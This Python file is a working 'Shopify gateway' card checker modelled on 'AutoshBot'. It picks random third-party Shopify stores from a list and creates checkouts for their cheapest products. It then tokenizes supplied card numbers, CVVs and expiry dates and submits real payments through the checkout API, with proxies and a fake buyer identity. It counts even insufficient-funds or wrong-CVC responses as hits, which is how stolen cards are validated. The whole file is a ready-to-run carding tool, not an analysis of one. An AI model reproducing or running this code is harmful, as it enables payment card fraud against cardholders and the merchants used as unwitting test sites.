"""
Simplified Shopify Gateway - Based on AutoshBot Logic
Just picks random stores and uses cheapest products - no complex price filtering
"""

import requests
import json
import time
import random
import re
from typing import Tuple, Optional, Dict, List


class SimpleShopifyGateway:
    """
    Simple Shopify gateway - AutoshBot style
    - Pick random store
    - Get cheapest product
    - Process payment
    No complex price filtering!
    """
    
    def __init__(self, stores_file: str = 'shopify_stores.txt', proxy: str = None):
        self.stores_file = stores_file
        self.stores = []
        self.failed_stores = set()
        self.total_attempts = 0
        self.successful_charges = 0
        self.name = "Shopify Simple Gateway"
        self.proxy = proxy
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        })
        
        # Set proxy if provided
        if self.proxy:
            self._set_proxy(self.proxy)
        
        self._load_stores()
    
    def _set_proxy(self, proxy_string: str):
        """Set proxy from string format: host:port:user:pass"""
        try:
            parts = proxy_string.split(':')
            if len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = parts[2]
                # Password might contain colons, so join remaining parts
                password = ':'.join(parts[3:])
                
                proxy_url = f"http://{user}:{password}@{host}:{port}"
                self.session.proxies = {
                    'http': proxy_url,
                    'https': proxy_url
                }
                print(f"  🔒 Using proxy: {host}:{port}")
            else:
                print(f"  ⚠️ Invalid proxy format: {proxy_string}")
        except Exception as e:
            print(f"  ⚠️ Proxy setup error: {e}")
    
    def _load_stores(self):
        """Load stores from file"""
        try:
            with open(self.stores_file, 'r') as f:
                self.stores = [line.strip() for line in f if line.strip()]
            print(f"✅ Loaded {len(self.stores)} stores")
        except Exception as e:
            print(f"❌ Failed to load stores: {e}")
            self.stores = []
    
    def _get_random_store(self) -> Optional[str]:
        """Get random store that hasn't failed recently"""
        available = [s for s in self.stores if s not in self.failed_stores]
        if not available:
            # Reset failed stores if all failed
            self.failed_stores.clear()
            available = self.stores
        
        return random.choice(available) if available else None
    
    def _get_cheapest_product(self, store_url: str) -> Optional[Dict]:
        """Get cheapest product from store - AutoshBot style"""
        try:
            # Clean URL
            if not store_url.startswith('http'):
                store_url = 'https://' + store_url
            
            # Get products
            products_url = f"{store_url}/products.json?limit=250"
            response = self.session.get(products_url, timeout=10)
            
            if response.status_code != 200:
                return None
            
            data = response.json()
            products = data.get('products', [])
            
            if not products:
                return None
            
            # Find cheapest product with available variant
            cheapest = None
            cheapest_price = float('inf')
            
            for product in products:
                variants = product.get('variants', [])
                for variant in variants:
                    if not variant.get('available', False):
                        continue
                    
                    price = float(variant.get('price', 999999))
                    if price < cheapest_price:
                        cheapest_price = price
                        cheapest = {
                            'variant_id': variant['id'],
                            'price': price,
                            'title': product.get('title', 'Unknown'),
                            'product_id': product.get('id')
                        }
            
            return cheapest
            
        except Exception as e:
            print(f"  Product fetch error: {e}")
            return None
    
    def _extract_between(self, text: str, start: str, end: str) -> Optional[str]:
        """Extract text between markers"""
        try:
            start_idx = text.find(start)
            if start_idx == -1:
                return None
            start_idx += len(start)
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return None
            return text[start_idx:end_idx]
        except:
            return None
    
    def _format_card(self, card_number: str) -> str:
        """Format card with spaces"""
        card_number = card_number.replace(' ', '')
        return ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
    
    def _get_payment_token(self, card_number: str, exp_month: str, exp_year: str,
                          cvv: str, first_name: str, last_name: str,
                          store_domain: str) -> Optional[str]:
        """Get payment token from Shopify"""
        try:
            formatted_card = self._format_card(card_number)
            if len(exp_year) == 2:
                exp_year = '20' + exp_year
            
            payload = {
                "credit_card": {
                    "month": int(exp_month),
                    "name": f"{first_name} {last_name}",
                    "number": formatted_card,
                    "verification_value": cvv,
                    "year": int(exp_year),
                    "start_month": "",
                    "start_year": "",
                    "issue_number": "",
                },
                "payment_session_scope": f"www.{store_domain}"
            }
            
            response = self.session.post(
                'https://deposit.shopifycs.com/sessions',
                json=payload,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('id')
            
            return None
            
        except Exception as e:
            print(f"  Token error: {e}")
            return None
    
    def _create_checkout(self, store_url: str, variant_id: int) -> Optional[Dict]:
        """Create checkout and get session data"""
        try:
            if not store_url.startswith('http'):
                store_url = 'https://' + store_url
            
            # Add to cart
            cart_url = f"{store_url}/cart/add.js"
            self.session.post(cart_url, data={'id': variant_id}, timeout=10)
            
            # Go to checkout
            checkout_url = f"{store_url}/checkout/"
            response = self.session.post(checkout_url, timeout=10)
            checkout_url = str(response.url)
            
            if 'login' in checkout_url.lower():
                return None
            
            # Get checkout page
            response = self.session.get(checkout_url, timeout=10)
            text = response.text
            
            # Extract session token
            sst = self._extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
            if not sst:
                time.sleep(1)
                response = self.session.get(checkout_url, timeout=10)
                text = response.text
                sst = self._extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
            
            if not sst:
                return None
            
            queue_token = self._extract_between(text, 'queueToken&quot;:&quot;', '&q')
            stable_id = self._extract_between(text, 'stableId&quot;:&quot;', '&q')
            
            pattern = r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?'
            currency_match = re.search(pattern, text.lower())
            currency = currency_match.group(1) if currency_match else 'USD'
            if not currency:
                currency = self._extract_between(text, 'urrencyCode&quot;:&quot;', '&q') or 'USD'
            
            return {
                'session_token': sst,
                'queue_token': queue_token,
                'stable_id': stable_id,
                'currency': currency.upper(),
                'checkout_url': checkout_url
            }
            
        except Exception as e:
            print(f"  Checkout error: {e}")
            return None
    
    def _check_success(self, response_text: str) -> bool:
        """Check if payment was successful using comprehensive keyword list"""
        success_keywords = [
            "Thank you for your order",
            "Thank you for your purchase",
            "Donation successfully completed",
            "succeeded",
            "success",
            "successfully",
            "approved",
            "Payment approved",
            "Transaction successful",
            "Your order is confirmed",
            "Payment accepted",
            "Your payment has already been processed",
            "'Your payment has already been processed",
            "Payment intent succeeded",
            'Thank you for your purchase!',
            'CompletePaymentChallenge',
            'INSUFFICIENT_FUNDS',
            '/authentications/',
            'authentications',
            'INCORRECT_CVC',
            'Your order is confirmed',
            "Thank you for your order.",
            "Order Placed",
            "payment confirmed",
            "COMPLETED",
            "Authorized",
            "Authorization succeeded",
            "Sale success",
            "Payment processed successfully",
            "Payment has been captured",
            "Your card was charged"
        ]
        return any(keyword.lower() in response_text.lower() for keyword in success_keywords)
    
    def _submit_payment(self, session_token: str, queue_token: str, payment_token: str,
                       stable_id: str, variant_id: int, store_url: str,
                       email: str, phone: str) -> Tuple[bool, str]:
        """Submit payment using GraphQL"""
        try:
            store_domain = store_url.replace('https://', '').replace('http://', '').split('/')[0]
            graphql_url = f"https://{store_domain}/checkouts/unstable/graphql"
            
            # Simplified shipping address
            address = {
                'address1': '123 Main St',
                'address2': '',
                'city': 'New York',
                'countryCode': 'US',
                'postalCode': '10001',
                'firstName': 'John',
                'lastName': 'Doe',
                'zoneCode': 'NY',
                'phone': phone,
            }
            
            # SubmitForCompletion mutation
            query = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage __typename}__typename}__typename}}'''
            
            variables = {
                'attemptToken': payment_token,
                'input': {
                    'sessionToken': session_token,
                    'queueToken': queue_token,
                    'purchaseProposal': {
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {'partialStreetAddress': address},
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'lowerBound': 0, 'upperBound': 999}
                                    }
                                },
                                'targetMerchandise': {'lines': [{'stableId': stable_id}]}
                            }]
                        },
                        'merchandise': {
                            'lines': [{
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariant/{variant_id}'
                                    }
                                },
                                'quantity': 1,
                                'stableId': stable_id
                            }]
                        },
                        'buyerIdentity': {'email': email, 'phone': phone},
                        'payment': {
                            'billingAddress': address,
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {'sessionId': payment_token}
                                }
                            }]
                        },
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}
                    }
                }
            }
            
            payload = {
                'operationName': 'SubmitForCompletion',
                'query': query,
                'variables': variables
            }
            
            response = self.session.post(graphql_url, json=payload, timeout=30)
            
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            # Check using comprehensive success keywords first
            if self._check_success(response.text):
                return True, "Payment successful (keyword match)"
            
            # Then check JSON response
            try:
                data = response.json()
                submit_result = data['data']['submitForCompletion']
                typename = submit_result.get('__typename', '')
                
                if typename in ['SubmitSuccess', 'SubmitAlreadyAccepted']:
                    receipt = submit_result.get('receipt', {})
                    receipt_id = receipt.get('id', 'Success')
                    return True, f"Receipt: {receipt_id}"
                elif typename == 'SubmitRejected':
                    errors = submit_result.get('errors', [])
                    if errors:
                        return False, errors[0].get('localizedMessage', 'Declined')
                    return False, "Payment rejected"
                else:
                    reason = submit_result.get('reason', 'Unknown failure')
                    return False, reason
            except:
                # If JSON parsing fails, check text response
                if self._check_success(response.text):
                    return True, "Payment successful"
                return False, "Unknown response format"
            
        except Exception as e:
            return False, f"Payment error: {e}"
    
    def get_stats(self) -> Dict:
        """Get gateway statistics"""
        return {
            'total_attempts': self.total_attempts,
            'successful_charges': self.successful_charges,
            'success_rate': f"{(self.successful_charges / self.total_attempts * 100):.1f}%" if self.total_attempts > 0 else "0%",
            'failed_stores': len(self.failed_stores),
            'available_stores': len(self.stores) - len(self.failed_stores),
        }
    
    def check(self, card_data: str, max_attempts: int = 50) -> Tuple[str, str, str]:
        """
        Check card - Simple AutoshBot style
        
        Args:
            card_data: "number|month|year|cvv"
            max_attempts: Max stores to try (default: 50 for better success rate)
        
        Returns:
            (status, message, card_type)
        """
        self.total_attempts += 1
        
        # Parse card
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                return 'error', 'Invalid format (use: number|month|year|cvv)', 'Unknown'
            
            card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]
        except Exception as e:
            return 'error', f'Parse error: {e}', 'Unknown'
        
        # Determine card type
        card_type = 'Unknown'
        if card_number.startswith('4'):
            card_type = 'Visa'
        elif card_number.startswith('5'):
            card_type = 'Mastercard'
        elif card_number.startswith('3'):
            card_type = 'Amex'
        
        # Try multiple stores
        for attempt in range(max_attempts):
            store_url = self._get_random_store()
            if not store_url:
                return 'error', 'No stores available', card_type
            
            print(f"\n[Attempt {attempt + 1}/{max_attempts}] Store: {store_url}")
            
            try:
                # Get cheapest product
                print("  [1/4] Finding product...")
                product = self._get_cheapest_product(store_url)
                if not product:
                    print("  ❌ No products")
                    self.failed_stores.add(store_url)
                    continue
                
                print(f"  ✅ Product: {product['title']} (${product['price']})")
                
                # Create checkout
                print("  [2/4] Creating checkout...")
                checkout = self._create_checkout(store_url, product['variant_id'])
                if not checkout:
                    print("  ❌ Checkout failed")
                    self.failed_stores.add(store_url)
                    continue
                
                print("  ✅ Checkout created")
                
                # Get payment token
                print("  [3/4] Getting token...")
                store_domain = store_url.replace('https://', '').replace('http://', '').split('/')[0]
                token = self._get_payment_token(
                    card_number, exp_month, exp_year, cvv,
                    'John', 'Doe', store_domain
                )
                if not token:
                    print("  ❌ Invalid card")
                    return 'declined', 'Invalid card details', card_type
                
                print("  ✅ Token obtained")
                
                # Submit payment
                print("  [4/4] Processing payment...")
                email = f"test{int(time.time())}@example.com"
                phone = "+12125551234"
                
                success, message = self._submit_payment(
                    checkout['session_token'],
                    checkout['queue_token'],
                    token,
                    checkout['stable_id'],
                    product['variant_id'],
                    store_url,
                    email,
                    phone
                )
                
                if success:
                    print("  ✅ APPROVED!")
                    self.successful_charges += 1
                    return 'approved', f"{message} | Store: {store_url} | ${product['price']}", card_type
                else:
                    # Check if it's a decline or error
                    decline_keywords = ['insufficient', 'declined', 'invalid', 'expired', 'incorrect']
                    if any(kw in message.lower() for kw in decline_keywords):
                        print(f"  ❌ DECLINED: {message}")
                        return 'declined', message, card_type
                    else:
                        print(f"  ⚠️ ERROR: {message}")
                        # Try next store
                        continue
                
            except Exception as e:
                print(f"  ⚠️ Exception: {e}")
                continue
        
        return 'error', 'All stores failed', card_type


if __name__ == "__main__":
    print("="*70)
    print("SIMPLE SHOPIFY GATEWAY TEST")
    print("="*70)
    
    gateway = SimpleShopifyGateway()
    
    # Test card
    test_card = "4111111111111111|12|25|123"
    
    print(f"\nTesting: {test_card[:4]}...{test_card[-7:]}\n")
    
    status, message, card_type = gateway.check(test_card, max_attempts=2)
    
    print(f"\n{'='*70}")
    print(f"RESULT:")
    print(f"  Status: {status}")
    print(f"  Message: {message}")
    print(f"  Card Type: {card_type}")
    print(f"{'='*70}")
